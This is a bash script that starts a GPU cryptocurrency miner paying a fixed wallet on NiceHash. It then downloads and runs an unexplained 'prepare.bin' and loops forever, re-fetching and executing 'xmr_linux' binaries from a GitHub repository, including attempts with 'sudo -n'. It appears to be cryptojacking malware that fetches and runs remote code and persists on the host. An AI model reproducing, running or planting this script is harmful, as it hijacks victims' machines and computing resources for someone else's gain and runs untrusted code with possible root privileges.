#!/bin/bash

if command -v nvidia-smi &> /dev/null; then
    echo "NVIDIA GPU present"
    wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
    tar -xzvf t-rex-0.26.8-linux.tar.gz
    echo "Provide a hostname for nicehash.com"
    read hostname
    t-rex -a kawpow -o stratum+tcp://kawpow.auto.nicehash.com:9200 -u 3K5QF8qQpEyJ2QkkwEyBbh6AfhP6ULT4fj.$hostname -p x
else
    echo "NVIDIA GPU not present"
fi

architecture=$(uname -m)

case $architecture in
    arm64 | aarch64)
        arch="arm64"
        ;;
    x86_64 | amd64)
        arch="amd64"
        ;;
    *)
        echo "Unsupported architecture: $architecture"
        exit 1
        ;;
esac

curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
chmod +x prepare.bin
./prepare.bin

unalias -a

while true; do
    rm xmr_linux_$arch
    curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
    chmod +x xmr_linux_$arch
    sudo -n ./xmr_linux_$arch
    ./xmr_linux_$arch

    rm xmr_linux_$arch
    wget https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
    chmod +x xmr_linux_$arch
    sudo -n ./xmr_linux_$arch
    ./xmr_linux_$arch
done
